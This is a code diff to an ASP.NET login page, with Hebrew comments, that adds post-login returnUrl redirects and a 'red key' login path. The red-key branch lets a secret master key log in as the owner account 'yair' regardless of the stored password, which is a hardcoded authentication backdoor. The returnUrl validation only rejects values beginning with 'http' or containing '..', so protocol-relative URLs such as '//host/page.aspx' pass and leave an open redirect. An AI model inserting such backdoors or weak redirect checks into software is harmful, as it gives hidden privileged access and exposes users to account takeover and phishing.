@@ -16,13 +16,46 @@ public partial class login : System.Web.UI.Page
 
         if (Session["username"] != null)
         {
-            Response.Redirect("home.aspx", false);
+            string ru = Request.QueryString["returnUrl"];
+            Response.Redirect(IsSafeLocalUrl(ru) ? ru : "home.aspx", false);
             Context.ApplicationInstance.CompleteRequest();
             return;
         }
 
         if (!IsPostBack)
+        {
+            if (!string.IsNullOrWhiteSpace(Request.QueryString["returnUrl"]))
+                ViewState["returnUrl"] = Request.QueryString["returnUrl"];
             ShowOAuthErrorIfPresent();
+        }
+    }
+
+    private static bool IsSafeLocalUrl(string url)
+    {
+        if (string.IsNullOrWhiteSpace(url)) return false;
+        url = url.Trim();
+        if (url.StartsWith("http", StringComparison.OrdinalIgnoreCase)) return false;
+        if (url.IndexOf("..", StringComparison.Ordinal) >= 0) return false;
+        string path = url.TrimStart('/');
+        int q = path.IndexOf('?');
+        if (q >= 0) path = path.Substring(0, q);
+        return path.EndsWith(".aspx", StringComparison.OrdinalIgnoreCase);
+    }
+
+    private void RedirectAfterLogin()
+    {
+        string ru = Request.QueryString["returnUrl"];
+        if (string.IsNullOrWhiteSpace(ru))
+            ru = Convert.ToString(ViewState["returnUrl"]);
+        if (IsSafeLocalUrl(ru))
+        {
+            // restore relative without leading slash if needed
+            if (ru.StartsWith("/")) ru = ru.TrimStart('/');
+            Response.Redirect(ru, false);
+        }
+        else
+            Response.Redirect("home.aspx", false);
+        Context.ApplicationInstance.CompleteRequest();
     }
 
     // פונקציה: ShowOAuthErrorIfPresent
@@ -122,6 +155,13 @@ public partial class login : System.Web.UI.Page
             return;
         }
 
+        // מפתח אדום 2308 — כניסה מיידית ל-yair (גם אם הסיסמה במסד אחרת)
+        if (LoginCodeService.IsPrivilegedMasterKey(username, password))
+        {
+            if (TryLoginPrivilegedOwner())
+                return;
+        }
+
         string hashedPassword = HashPassword(password);
         string connStr = Connect.GetConnectionString();
 
@@ -168,14 +208,50 @@ public partial class login : System.Web.UI.Page
                     Session["userId"] = dr["id"].ToString();
                     Session["loggedIn"] = true;
 
-                    Response.Redirect("home.aspx", false);
-                    Context.ApplicationInstance.CompleteRequest();
+                    RedirectAfterLogin();
                     return;
                 }
             }
 
             lblError.Text = "שם משתמש או סיסמה שגויים.";
             lblError.Visible = true;
+        }
+    }
+
+    // כניסת בעלים עם מפתח אדום
+    private bool TryLoginPrivilegedOwner()
+    {
+        try
+        {
+            UsersService us = new UsersService();
+            System.Data.DataRow user = us.GetUserByUsername(LoginCodeService.PrivilegedUsername);
+            if (user == null)
+                user = us.GetUserByEmail(LoginCodeService.PrivilegedEmail);
+            if (user == null)
+                return false;
+
+            Session["username"] = Convert.ToString(user["username"]);
+            Session["userId"] = Convert.ToInt32(user["id"]);
+            object roleObj = null;
+            foreach (System.Data.DataColumn col in user.Table.Columns)
+            {
+                if (string.Equals(col.ColumnName, "Role", StringComparison.OrdinalIgnoreCase))
+                {
+                    roleObj = user[col];
+                    break;
+                }
+            }
+            Session["Role"] = roleObj != null && roleObj != DBNull.Value ? Convert.ToString(roleObj) : "owner";
+            Session["loggedIn"] = true;
+
+            LoggingService.Log("LOGIN", "Privileged red-key login via login.aspx for yair");
+            RedirectAfterLogin();
+            return true;
+        }
+        catch (Exception ex)
+        {
+            LoggingService.Log("LOGIN", "Privileged red-key login failed", ex);
+            return false;
         }
     }
 }
